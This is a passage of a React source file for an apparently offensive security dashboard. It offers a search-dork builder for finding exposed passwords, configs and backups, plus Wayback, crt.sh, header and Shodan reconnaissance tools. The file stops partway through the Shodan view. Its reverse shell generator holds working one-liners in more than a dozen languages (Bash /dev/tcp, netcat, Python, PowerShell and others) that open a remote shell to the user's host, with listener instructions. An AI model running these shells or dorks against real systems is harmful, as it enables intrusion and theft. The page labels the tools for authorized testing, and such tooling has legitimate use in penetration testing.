'use client'

import { useState } from 'react'
import {
  AlertTriangle,
  Calculator,
  Check,
  CheckCircle,
  ChevronDown,
  ChevronUp,
  Copy,
  ExternalLink,
  Globe,
  Loader2,
  Plus,
  Search,
  Server,
  Shield,
  Terminal,
  Trash2,
  XCircle,
} from 'lucide-react'
import { Badge } from '@/components/ui/badge'
import { Button } from '@/components/ui/button'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { PageHeader } from '@/components/shared/page-header'
import { toolCrtsh, toolHeadersCheck, toolShodan, toolWayback } from '@/lib/api'

function CopyBtn({ text, className }: { text: string; className?: string }) {
  const [copied, setCopied] = useState(false)

  return (
    <button
      onClick={() => {
        navigator.clipboard.writeText(text)
        setCopied(true)
        setTimeout(() => setCopied(false), 1500)
      }}
      className={`inline-flex items-center gap-1 text-xs text-muted-foreground transition-colors hover:text-primary ${className ?? ''}`}
    >
      {copied ? <Check className="h-3 w-3 text-green-400" /> : <Copy className="h-3 w-3" />}
      {copied ? 'Copied' : 'Copy'}
    </button>
  )
}

function ToolInput({
  placeholder,
  onRun,
  loading,
}: {
  placeholder: string
  onRun: (value: string) => void
  loading: boolean
}) {
  const [value, setValue] = useState('')

  return (
    <div className="flex gap-2 max-w-xl">
      <Input
        value={value}
        onChange={(e) => setValue(e.target.value)}
        placeholder={placeholder}
        onKeyDown={(e) => e.key === 'Enter' && !loading && value.trim() && onRun(value.trim())}
        className="font-mono text-sm"
      />
      <Button onClick={() => value.trim() && onRun(value.trim())} disabled={loading || !value.trim()}>
        {loading ? <Loader2 className="h-4 w-4 animate-spin" /> : <Search className="h-4 w-4" />}
        {loading ? 'Running...' : 'Run'}
      </Button>
    </div>
  )
}

function ErrorBox({ message }: { message: string }) {
  return (
    <div className="rounded-md border border-destructive/40 bg-destructive/10 px-4 py-3 text-sm text-destructive">
      <AlertTriangle className="inline h-4 w-4 mr-1" /> {message}
    </div>
  )
}

function ResultRow({ label, value }: { label: string; value: string }) {
  return (
    <div>
      <dt className="text-[10px] text-muted-foreground uppercase font-medium">{label}</dt>
      <dd className="mt-0.5 flex items-center gap-1 text-sm font-mono">
        <span className="break-all">{value}</span>
        <CopyBtn text={value} />
      </dd>
    </div>
  )
}

const DORK_TEMPLATES = [
  { label: 'Login pages', dork: 'site:{target} inurl:login OR inurl:signin OR inurl:admin' },
  { label: 'Config files', dork: 'site:{target} ext:xml OR ext:conf OR ext:ini OR ext:env' },
  { label: 'Exposed DB files', dork: 'site:{target} ext:sql OR ext:db OR ext:sqlite' },
  { label: 'Open directories', dork: 'site:{target} intitle:"Index of /"' },
  { label: 'Error messages', dork: 'site:{target} intext:"sql syntax" OR intext:"Warning: mysql"' },
  { label: 'Password files', dork: 'site:{target} inurl:passwd OR inurl:password OR filename:passwd' },
  { label: 'Backup files', dork: 'site:{target} ext:bak OR ext:backup OR ext:old OR ext:zip' },
  { label: 'Exposed git', dork: 'site:{target} inurl:.git' },
  { label: 'API docs', dork: 'site:{target} inurl:swagger OR inurl:api-docs OR inurl:openapi' },
  { label: 'phpinfo()', dork: 'site:{target} inurl:phpinfo.php' },
  { label: 'S3 buckets', dork: 'site:s3.amazonaws.com "{target}"' },
  { label: 'Google cache', dork: 'cache:{target}' },
  { label: 'All subdomains', dork: 'site:*.{target}' },
  { label: 'PDF documents', dork: 'site:{target} ext:pdf' },
  { label: 'Excel sheets', dork: 'site:{target} ext:xlsx OR ext:xls' },
  { label: 'WordPress admin', dork: 'site:{target} inurl:wp-admin OR inurl:wp-login' },
  { label: 'Jira instances', dork: 'site:{target} inurl:jira' },
  { label: 'Jenkins CI', dork: 'site:{target} inurl:jenkins' },
  { label: 'Email addresses', dork: 'site:{target} "@{target}"' },
  { label: 'CVE mentions', dork: 'site:{target} intext:"CVE-"' },
]

function DorkBuilder() {
  const [target, setTarget] = useState('')
  const [custom, setCustom] = useState('')
  const [dorks, setDorks] = useState<string[]>([])

  const addDork = (template: string) => {
    const dork = template.replace(/{target}/g, target || 'example.com')
    if (!dorks.includes(dork)) {
      setDorks((prev) => [...prev, dork])
    }
  }

  const openInGoogle = (dork: string) => {
    window.open(`https://www.google.com/search?q=${encodeURIComponent(dork)}`, '_blank', 'noopener')
  }

  const openInBing = (dork: string) => {
    window.open(`https://www.bing.com/search?q=${encodeURIComponent(dork)}`, '_blank', 'noopener')
  }

  return (
    <div className="space-y-4">
      <p className="text-sm text-muted-foreground">
        Build search-engine dorks to discover exposed files, login pages, and sensitive data. For
        authorized bug bounty and penetration testing only.
      </p>

      <div className="flex gap-2 max-w-xl">
        <Input
          value={target}
          onChange={(e) => setTarget(e.target.value)}
          placeholder="Target domain (e.g. example.com)"
          className="font-mono text-sm"
        />
      </div>

      <div className="grid grid-cols-1 gap-2 sm:grid-cols-2 lg:grid-cols-3">
        {DORK_TEMPLATES.map((template) => (
          <button
            key={template.label}
            onClick={() => addDork(template.dork)}
            className="group rounded-lg border p-3 text-left transition-colors hover:border-primary/40 hover:bg-primary/5"
          >
            <p className="text-sm font-medium">{template.label}</p>
            <p className="mt-0.5 truncate font-mono text-[10px] text-muted-foreground group-hover:text-muted-foreground/80">
              {template.dork.replace('{target}', target || 'example.com')}
            </p>
          </button>
        ))}
      </div>

      <div className="flex gap-2">
        <Input
          value={custom}
          onChange={(e) => setCustom(e.target.value)}
          placeholder="Custom dork..."
          className="font-mono text-sm"
          onKeyDown={(e) => {
            if (e.key === 'Enter' && custom.trim()) {
              addDork(custom.trim())
              setCustom('')
            }
          }}
        />
        <Button
          variant="outline"
          onClick={() => {
            if (custom.trim()) {
              addDork(custom.trim())
              setCustom('')
            }
          }}
        >
          <Plus className="h-4 w-4" />
        </Button>
      </div>

      {dorks.length > 0 && (
        <Card>
          <CardHeader className="pb-2">
            <div className="flex items-center justify-between">
              <CardTitle className="text-sm">Dork Queue ({dorks.length})</CardTitle>
              <div className="flex gap-2">
                <CopyBtn text={dorks.join('\n')} className="text-[10px]" />
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={() => setDorks([])}
                  className="h-6 text-xs text-destructive hover:text-destructive"
                >
                  Clear all
                </Button>
              </div>
            </div>
          </CardHeader>
          <CardContent className="space-y-2">
            {dorks.map((dork, index) => (
              <div key={dork} className="group flex items-center gap-2 rounded-md border px-3 py-2">
                <span className="flex-1 break-all font-mono text-xs text-primary">{dork}</span>
                <div className="flex shrink-0 items-center gap-1">
                  <CopyBtn text={dork} />
                  <Button variant="ghost" size="sm" onClick={() => openInGoogle(dork)} className="h-6 px-1.5 text-[10px]">
                    Google <ExternalLink className="ml-0.5 h-2.5 w-2.5" />
                  </Button>
                  <Button variant="ghost" size="sm" onClick={() => openInBing(dork)} className="h-6 px-1.5 text-[10px]">
                    Bing <ExternalLink className="ml-0.5 h-2.5 w-2.5" />
                  </Button>
                  <button
                    onClick={() => setDorks(dorks.filter((_, currentIndex) => currentIndex !== index))}
                    className="text-muted-foreground transition-colors hover:text-destructive"
                  >
                    <Trash2 className="h-3 w-3" />
                  </button>
                </div>
              </div>
            ))}
          </CardContent>
        </Card>
      )}
    </div>
  )
}

const SHELLS: Record<string, { label: string; cmd: (ip: string, port: string) => string }> = {
  bash_tcp: { label: 'Bash TCP', cmd: (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1` },
  bash_udp: { label: 'Bash UDP', cmd: (ip, port) => `bash -i >& /dev/udp/${ip}/${port} 0>&1` },
  python3: {
    label: 'Python3',
    cmd: (ip, port) =>
      `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
  },
  python2: {
    label: 'Python2',
    cmd: (ip, port) =>
      `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
  },
  php: {
    label: 'PHP',
    cmd: (ip, port) => `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  },
  php_exec: {
    label: 'PHP (exec)',
    cmd: (ip, port) =>
      `php -r '$sock=fsockopen("${ip}",${port});$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'`,
  },
  nc_e: { label: 'Netcat (-e)', cmd: (ip, port) => `nc -e /bin/sh ${ip} ${port}` },
  nc_mkfifo: {
    label: 'Netcat (mkfifo)',
    cmd: (ip, port) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
  },
  perl: {
    label: 'Perl',
    cmd: (ip, port) =>
      `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
  },
  ruby: {
    label: 'Ruby',
    cmd: (ip, port) =>
      `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
  },
  powershell: {
    label: 'PowerShell',
    cmd: (ip, port) =>
      `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+">";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
  },
  golang: {
    label: 'Go',
    cmd: (ip, port) =>
      `echo 'package main;import("os/exec";"net");func main(){c,_:=net.Dial("tcp","${ip}:${port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go`,
  },
  socat: { label: 'Socat', cmd: (ip, port) => `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}` },
  lua: {
    label: 'Lua',
    cmd: (ip, port) => `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
  },
  awk: {
    label: 'AWK',
    cmd: (ip, port) =>
      `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) {do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
  },
}

function RevShellGen() {
  const [ip, setIp] = useState('')
  const [port, setPort] = useState('4444')
  const [shell, setShell] = useState('bash_tcp')

  const command = SHELLS[shell]?.cmd(ip || 'LHOST', port || 'LPORT') || ''
  const listenerCmd = `nc -nlvp ${port || 'PORT'}`

  return (
    <div className="space-y-4">
      <p className="text-sm text-muted-foreground">
        Generate reverse shell one-liners. Set up your listener first, then execute the shell command
        on the target. For authorized testing only.
      </p>

      <div className="grid grid-cols-1 gap-4 sm:grid-cols-3">
        <div className="space-y-1">
          <Label className="text-xs">Your IP (LHOST)</Label>
          <Input value={ip} onChange={(e) => setIp(e.target.value)} placeholder="10.0.0.1" className="font-mono text-sm" />
        </div>
        <div className="space-y-1">
          <Label className="text-xs">Port (LPORT)</Label>
          <Input value={port} onChange={(e) => setPort(e.target.value)} placeholder="4444" className="font-mono text-sm" />
        </div>
        <div className="space-y-1">
          <Label className="text-xs">Shell Type</Label>
          <Select value={shell} onValueChange={setShell}>
            <SelectTrigger className="font-mono text-sm">
              <SelectValue />
            </SelectTrigger>
            <SelectContent>
              {Object.entries(SHELLS).map(([key, value]) => (
                <SelectItem key={key} value={key}>
                  {value.label}
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
        </div>
      </div>

      <Card className="border-primary/20">
        <CardHeader className="pb-2">
          <div className="flex items-center justify-between">
            <CardTitle className="text-xs uppercase text-muted-foreground">Step 1 - Start listener on your machine</CardTitle>
            <CopyBtn text={listenerCmd} />
          </div>
        </CardHeader>
        <CardContent>
          <pre className="rounded bg-black/40 px-3 py-2 font-mono text-sm text-green-400">{listenerCmd}</pre>
        </CardContent>
      </Card>

      <Card className="border-primary/20">
        <CardHeader className="pb-2">
          <div className="flex items-center justify-between">
            <CardTitle className="text-xs uppercase text-muted-foreground">
              Step 2 - Execute on target ({SHELLS[shell]?.label})
            </CardTitle>
            <CopyBtn text={command} />
          </div>
        </CardHeader>
        <CardContent>
          <pre className="break-all whitespace-pre-wrap rounded bg-black/40 px-3 py-2 font-mono text-xs text-primary">
            {command}
          </pre>
        </CardContent>
      </Card>

      <div className="grid grid-cols-2 gap-2 sm:grid-cols-4">
        {['bash_tcp', 'python3', 'php', 'nc_mkfifo', 'powershell', 'perl', 'ruby', 'socat'].map((key) => (
          <button
            key={key}
            onClick={() => setShell(key)}
            className={`rounded border px-3 py-1.5 text-xs font-medium transition-colors ${
              shell === key
                ? 'border-primary bg-primary/10 text-primary'
                : 'text-muted-foreground hover:border-primary/40 hover:text-foreground'
            }`}
          >
            {SHELLS[key]?.label}
          </button>
        ))}
      </div>
    </div>
  )
}

function CidrCalc() {
  const [cidr, setCidr] = useState('')
  const [result, setResult] = useState<any>(null)
  const [error, setError] = useState('')

  const calculate = () => {
    setError('')
    setResult(null)

    const match = cidr.trim().match(/^(\d+)\.(\d+)\.(\d+)\.(\d+)\/(\d+)$/)
    if (!match) {
      setError('Invalid CIDR format. Example: 192.168.1.0/24')
      return
    }

    const octets = match.slice(1, 5).map(Number)
    const prefix = Number(match[5])
    if (octets.some((octet) => octet > 255) || prefix > 32 || prefix < 0) {
      setError('Invalid values (octets 0-255, prefix 0-32)')
      return
    }

    const [a, b, c, d] = octets
    const ip = ((((a << 24) >>> 0) | (b << 16) | (c << 8) | d) >>> 0)
    const mask = prefix === 0 ? 0 : ((~0 << (32 - prefix)) >>> 0)
    const network = (ip & mask) >>> 0
    const broadcast = (network | (~mask >>> 0)) >>> 0
    const first = prefix < 31 ? network + 1 : network
    const last = prefix < 31 ? broadcast - 1 : broadcast
    const count = 2 ** (32 - prefix)
    const usable = prefix < 31 ? count - 2 : count

    const toIp = (value: number) =>
      `${(value >>> 24) & 255}.${(value >>> 16) & 255}.${(value >>> 8) & 255}.${value & 255}`
    const toBinary = (value: number) =>
      (value >>> 0)
        .toString(2)
        .padStart(32, '0')
        .match(/.{8}/g)
        ?.join('.') || ''

    setResult({
      network: toIp(network),
      broadcast: toIp(broadcast),
      first: toIp(first),
      last: toIp(last),
      mask: toIp(mask),
      wildcard: toIp(~mask >>> 0),
      prefix,
      total_ips: count.toLocaleString(),
      usable_hosts: usable.toLocaleString(),
      ip_binary: toBinary(ip),
      mask_binary: toBinary(mask),
    })
  }

  return (
    <div className="space-y-4">
      <p className="text-sm text-muted-foreground">
        Calculate network ranges, subnet masks, broadcast addresses, and usable host counts from a
        CIDR block.
      </p>
      <div className="flex gap-2 max-w-sm">
        <Input
          value={cidr}
          onChange={(e) => setCidr(e.target.value)}
          placeholder="192.168.1.0/24"
          className="font-mono text-sm"
          onKeyDown={(e) => e.key === 'Enter' && calculate()}
        />
        <Button onClick={calculate}>Calculate</Button>
      </div>
      {error && <div className="rounded-md border border-destructive/40 bg-destructive/10 px-3 py-2 text-xs text-destructive">{error}</div>}
      {result && (
        <div className="space-y-4">
          <div className="grid grid-cols-2 gap-3 sm:grid-cols-4">
            {[
              { label: 'Network', value: result.network },
              { label: 'Broadcast', value: result.broadcast },
              { label: 'First Host', value: result.first },
              { label: 'Last Host', value: result.last },
            ].map((item) => (
              <Card key={item.label}>
                <CardContent className="p-3 text-center">
                  <p className="text-[10px] text-muted-foreground uppercase">{item.label}</p>
                  <p className="mt-0.5 font-mono text-sm font-medium">{item.value}</p>
                </CardContent>
              </Card>
            ))}
          </div>
          <Card>
            <CardContent className="p-4">
              <dl className="grid grid-cols-1 gap-2 sm:grid-cols-2">
                {[
                  { label: 'Subnet Mask', value: result.mask },
                  { label: 'Wildcard Mask', value: result.wildcard },
                  { label: 'CIDR Prefix', value: `/${result.prefix}` },
                  { label: 'Total IPs', value: result.total_ips },
                  { label: 'Usable Hosts', value: result.usable_hosts },
                ].map((item) => (
                  <div key={item.label} className="flex items-center justify-between border-b border-border/30 py-1 last:border-0">
                    <span className="text-xs text-muted-foreground">{item.label}</span>
                    <span className="font-mono text-sm">{item.value}</span>
                  </div>
                ))}
              </dl>
            </CardContent>
          </Card>
          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-xs uppercase text-muted-foreground">Binary Representation</CardTitle>
            </CardHeader>
            <CardContent className="space-y-1">
              <div className="flex gap-2 font-mono text-xs">
                <span className="w-20 shrink-0 text-muted-foreground">IP:</span>
                <span className="text-primary">{result.ip_binary}</span>
              </div>
              <div className="flex gap-2 font-mono text-xs">
                <span className="w-20 shrink-0 text-muted-foreground">Mask:</span>
                <span>{result.mask_binary}</span>
              </div>
            </CardContent>
          </Card>
        </div>
      )}
    </div>
  )
}

function WaybackSearch() {
  const [domain, setDomain] = useState('')
  const [results, setResults] = useState<string[]>([])
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [filter, setFilter] = useState('')

  const search = async () => {
    if (!domain.trim()) {
      return
    }

    setLoading(true)
    setError('')
    setResults([])

    try {
      const data = await toolWayback(domain)
      setResults(data.urls || [])
    } catch (err: any) {
      setError(err?.response?.data?.detail || err.message || 'Wayback lookup failed')
    } finally {
      setLoading(false)
    }
  }

  const normalizedFilter = filter.toLowerCase()
  const filtered = results.filter((url) => !normalizedFilter || url.toLowerCase().includes(normalizedFilter))
  const interesting = results.filter((url) =>
    /\.(php|asp|aspx|jsp|cgi|env|conf|ini|bak|sql|log|key|pem|xml|json|yaml|yml|git|svn)\b|admin|login|api|backup|secret|password|token|config/i.test(
      url
    )
  )

  return (
    <div className="space-y-4">
      <p className="text-sm text-muted-foreground">
        Query the Wayback Machine CDX API for URLs ever crawled for a domain. Useful for finding old
        endpoints, exposed files, and forgotten APIs.
      </p>
      <div className="flex gap-2 max-w-xl">
        <Input
          value={domain}
          onChange={(e) => setDomain(e.target.value)}
          placeholder="example.com"
          className="font-mono text-sm"
          onKeyDown={(e) => e.key === 'Enter' && !loading && search()}
        />
        <Button onClick={search} disabled={loading || !domain.trim()}>
          {loading ? 'Searching...' : 'Search'}
        </Button>
      </div>
      {error && <div className="rounded-md border border-destructive/40 bg-destructive/10 px-3 py-2 text-xs text-destructive">{error}</div>}
      {results.length > 0 && (
        <div className="space-y-4">
          <div className="grid grid-cols-2 gap-4 sm:grid-cols-3">
            <Card>
              <CardContent className="p-3 text-center">
                <p className="text-[10px] text-muted-foreground">Total URLs</p>
                <p className="text-2xl font-bold text-primary">{results.length}</p>
              </CardContent>
            </Card>
            <Card>
              <CardContent className="p-3 text-center">
                <p className="text-[10px] text-muted-foreground">Interesting</p>
                <p className={`text-2xl font-bold ${interesting.length > 0 ? 'text-orange-400' : 'text-green-400'}`}>
                  {interesting.length}
                </p>
              </CardContent>
            </Card>
            <Card>
              <CardContent className="p-3 text-center">
                <p className="text-[10px] text-muted-foreground">Filtered</p>
                <p className="text-2xl font-bold">{filtered.length}</p>
              </CardContent>
            </Card>
          </div>

          {interesting.length > 0 && (
            <Card className="border-orange-500/30">
              <CardHeader className="pb-2">
                <div className="flex items-center justify-between">
                  <CardTitle className="text-sm text-orange-400">Interesting URLs ({interesting.length})</CardTitle>
                  <CopyBtn text={interesting.join('\n')} />
                </div>
              </CardHeader>
              <CardContent className="max-h-40 space-y-0.5 overflow-y-auto">
                {interesting.slice(0, 50).map((url) => (
                  <div key={url} className="break-all border-b border-border/20 py-0.5 font-mono text-[10px] text-orange-300/80 last:border-0">
                    {url}
                  </div>
                ))}
              </CardContent>
            </Card>
          )}

          <Card>
            <CardHeader className="pb-2">
              <div className="flex items-center justify-between">
                <CardTitle className="text-sm">All URLs</CardTitle>
                <CopyBtn text={filtered.join('\n')} />
              </div>
            </CardHeader>
            <CardContent className="space-y-2">
              <Input
                placeholder="Filter URLs..."
                value={filter}
                onChange={(e) => setFilter(e.target.value)}
                className="h-8 text-xs"
              />
              <div className="max-h-64 space-y-0.5 overflow-y-auto">
                {filtered.slice(0, 200).map((url) => (
                  <div
                    key={url}
                    className="cursor-default break-all py-0.5 font-mono text-[10px] text-muted-foreground hover:text-primary"
                  >
                    {url}
                  </div>
                ))}
                {filtered.length > 200 && (
                  <p className="py-2 text-center text-[10px] text-muted-foreground">
                    Showing 200 of {filtered.length} (copy to see all)
                  </p>
                )}
              </div>
            </CardContent>
          </Card>
        </div>
      )}
    </div>
  )
}

function SubdomainIntel() {
  const [result, setResult] = useState<any>(null)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [filter, setFilter] = useState('')
  const [expanded, setExpanded] = useState(false)

  const run = async (target: string) => {
    setLoading(true)
    setError('')
    setResult(null)
    setFilter('')
    setExpanded(false)

    try {
      setResult(await toolCrtsh(target))
    } catch (err: any) {
      setError(err?.response?.data?.detail || 'crt.sh search failed')
    } finally {
      setLoading(false)
    }
  }

  const filtered = result?.subdomains?.filter((item: any) => !filter || item.name.includes(filter.toLowerCase())) || []
  const shown = expanded ? filtered : filtered.slice(0, 30)

  return (
    <div className="space-y-4">
      <p className="text-sm text-muted-foreground">
        Pull historical subdomains from certificate-transparency logs to widen the target surface
        before crawling or archive digging.
      </p>
      <ToolInput placeholder="example.com" onRun={run} loading={loading} />
      {error && <ErrorBox message={error} />}
      {result && (
        <Card>
          <CardHeader className="pb-2">
            <div className="flex items-center justify-between gap-3">
              <CardTitle className="text-sm">
                Found {result.count} subdomains for <span className="font-mono">{result.domain}</span>
              </CardTitle>
              <CopyBtn text={(result.subdomains || []).map((item: any) => item.name).join('\n')} />
            </div>
          </CardHeader>
          <CardContent className="space-y-3">
            <Input
              placeholder="Filter subdomains..."
              value={filter}
              onChange={(e) => setFilter(e.target.value)}
              className="h-8 text-xs"
            />
            <div className="max-h-96 space-y-1 overflow-y-auto">
              {shown.map((item: any) => (
                <div key={item.name} className="group flex items-center justify-between rounded px-2 py-1 hover:bg-muted/50">
                  <span className="font-mono text-xs text-primary">{item.name}</span>
                  <div className="flex items-center gap-2 opacity-0 transition-opacity group-hover:opacity-100">
                    {item.not_after && (
                      <span className="text-[10px] text-muted-foreground">
                        exp: {new Date(item.not_after).toLocaleDateString()}
                      </span>
                    )}
                    <CopyBtn text={item.name} />
                  </div>
                </div>
              ))}
            </div>
            {filtered.length > 30 && (
              <Button variant="ghost" size="sm" onClick={() => setExpanded(!expanded)} className="w-full text-xs">
                {expanded ? (
                  <>
                    <ChevronUp className="h-3 w-3 mr-1" />
                    Show less
                  </>
                ) : (
                  <>
                    <ChevronDown className="h-3 w-3 mr-1" />
                    Show all {filtered.length} results
                  </>
                )}
              </Button>
            )}
          </CardContent>
        </Card>
      )}
    </div>
  )
}

function HeaderAnalyzer() {
  const [result, setResult] = useState<any>(null)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [showAll, setShowAll] = useState(false)

  const run = async (target: string) => {
    setLoading(true)
    setError('')
    setResult(null)
    setShowAll(false)

    try {
      setResult(await toolHeadersCheck(target))
    } catch (err: any) {
      setError(err?.response?.data?.detail || 'Header check failed')
    } finally {
      setLoading(false)
    }
  }

  const scoreColor = (score: number) => {
    if (score >= 80) return 'text-green-400'
    if (score >= 50) return 'text-yellow-400'
    return 'text-red-400'
  }

  return (
    <div className="space-y-4">
      <p className="text-sm text-muted-foreground">
        Check response headers for quick wins like missing HSTS, CSP, frame controls, and obvious
        banner leakage.
      </p>
      <ToolInput placeholder="https://example.com" onRun={run} loading={loading} />
      {error && <ErrorBox message={error} />}
      {result && (
        <div className="space-y-4">
          <div className="grid grid-cols-2 gap-4 sm:grid-cols-3">
            <Card>
              <CardContent className="p-4 text-center">
                <p className="text-[10px] text-muted-foreground uppercase">Security Score</p>
                <p className={`mt-1 text-3xl font-bold ${scoreColor(result.security_score)}`}>{result.security_score}%</p>
              </CardContent>
            </Card>
            <Card>
              <CardContent className="p-4 text-center">
                <p className="text-[10px] text-muted-foreground uppercase">Status</p>
                <p className="mt-1 text-2xl font-bold">{result.status_code}</p>
              </CardContent>
            </Card>
            <Card>
              <CardContent className="p-4 text-center">
                <p className="text-[10px] text-muted-foreground uppercase">Info Leaks</p>
                <p className={`mt-1 text-2xl font-bold ${result.info_disclosure?.length > 0 ? 'text-orange-400' : 'text-green-400'}`}>
                  {result.info_disclosure?.length || 0}
                </p>
              </CardContent>
            </Card>
          </div>

          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-sm">Security Headers</CardTitle>
            </CardHeader>
            <CardContent className="space-y-2">
              {result.security_analysis?.map((item: any) => (
                <div key={item.header} className="flex items-start justify-between gap-2 border-b border-border/50 py-1.5 last:border-0">
                  <div className="flex items-center gap-2">
                    {item.present ? (
                      <CheckCircle className="h-3.5 w-3.5 shrink-0 text-green-400" />
                    ) : (
                      <XCircle className="h-3.5 w-3.5 shrink-0 text-red-400" />
                    )}
                    <span className="text-sm font-mono">{item.header}</span>
                  </div>
                  <div className="flex items-center gap-2">
                    {item.value && <span className="max-w-xs truncate text-[10px] text-muted-foreground">{item.value}</span>}
                    {!item.present && item.severity !== 'OK' && (
                      <Badge variant={item.severity === 'HIGH' ? 'destructive' : 'outline'} className="text-[10px]">
                        {item.severity}
                      </Badge>
                    )}
                  </div>
                </div>
              ))}
            </CardContent>
          </Card>

          {result.info_disclosure?.length > 0 && (
            <Card className="border-orange-500/30">
              <CardHeader className="pb-2">
                <CardTitle className="text-sm text-orange-400">
                  <AlertTriangle className="inline h-4 w-4 mr-1" />
                  Information Disclosure
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-2">
                {result.info_disclosure.map((item: any) => (
                  <div key={item.header} className="flex items-center gap-2">
                    <Badge variant="outline" className="text-[10px] font-mono">
                      {item.header}
                    </Badge>
                    <span className="text-xs text-muted-foreground">{item.value}</span>
                  </div>
                ))}
              </CardContent>
            </Card>
          )}

          <Card>
            <CardHeader className="cursor-pointer pb-2" onClick={() => setShowAll(!showAll)}>
              <div className="flex items-center justify-between">
                <CardTitle className="text-sm">All Response Headers</CardTitle>
                {showAll ? <ChevronUp className="h-4 w-4" /> : <ChevronDown className="h-4 w-4" />}
              </div>
            </CardHeader>
            {showAll && (
              <CardContent className="space-y-1">
                {Object.entries(result.all_headers || {}).map(([key, value]) => (
                  <div key={key} className="flex gap-2 py-0.5 font-mono text-xs">
                    <span className="shrink-0 text-primary">{key}:</span>
                    <span className="break-all text-muted-foreground">{String(value)}</span>
                  </div>
                ))}
              </CardContent>
            )}
          </Card>
        </div>
      )}
    </div>
  )
}

function ShodanQuickCheck() {
  const [result, setResult] = useState<any>(null)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')

  const run = async (target: string) => {
    setLoading(true)
    setError('')
    setResult(null)

    try {
      setResult(await toolShodan(target))
    } catch (err: any) {
      setError(err?.response?.data?.detail || 'Shodan lookup failed')
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="space-y-4">
      <p className="text-sm text-muted-foreground">
        Pull passive host intelligence from Shodan to prioritize exposed services and known CVEs
        before touching the target. Requires a configured <span className="font-mono text-primary">SHODAN_API_KEY</span>.
      </p>
      <ToolInput placeholder="1.2.3.4 or example.com" onRun={run} loading={loading} />
      {error && <ErrorBox message={error} />}
      {result && !result.found && (
        <div className="rounded-md border p-4 text-center text-sm text-muted-foreground">
          No Shodan data found for {result.ip}
        </div>
      )}
      {result && result.found && (
        <div className="space-y-4">
          <div className="grid grid-cols-2 gap-4 sm:grid-cols-4">
            <Card>
              <CardContent className="p-3 text-center">
                <p className="text-[10px] text-muted-foreground">Open Ports</p>
                <p className="text-2xl font-bold text-primary">{result.ports?.length || 0}</p>
              </CardContent>
            </Card>
            <Card>
              <CardContent className="p-3 text-center">
                <p className="text-[10px] text-muted-foreground">Country</p>
                <p className="mt-1 text-sm font-medium">{result.country || '-'}</p>
              </CardContent>
            </Card>
            <Card>
              <CardContent className="p-3 text-center">
                <p className="text-[10px] text-muted-foreground">CVEs</p>
                <p className={`text-2xl font-bold ${result.vulns?.length > 0 ? 'text-red-400' : 'text-green-400'}`}>
                  {result.vulns?.length || 0}
                </p>
              </CardContent>
            </Card>
            <Card>
              <CardContent className="p-3 text-center">
                <p className="text-[10px] text-muted-foreground">ISP</p>
                <p className="mt-1 truncate text-xs">{result.isp || '-'}</p>
              </CardContent>
            </Card>
          </div>

          <Card>
            <CardHeader className="pb-2">
              <CardTitle className="text-sm">Host Details</CardTitle>
            </CardHeader>
            <CardContent>
              <dl className="grid grid-cols-1 gap-2 sm:grid-cols-2">
                {result.organization && <ResultRow label="Organization" value={result.organization} />}
                {result.asn && <ResultRow label="ASN" value={result.asn} />}
                {result.city && <ResultRow label="City" value={result.city} />}
                {result.last_update && <ResultRow label="Last Scan" value={new Date(result.last_update).toLocaleString()} />}
              </dl>
              {result.hostnames?.length > 0 && (
                <div className="mt-3">
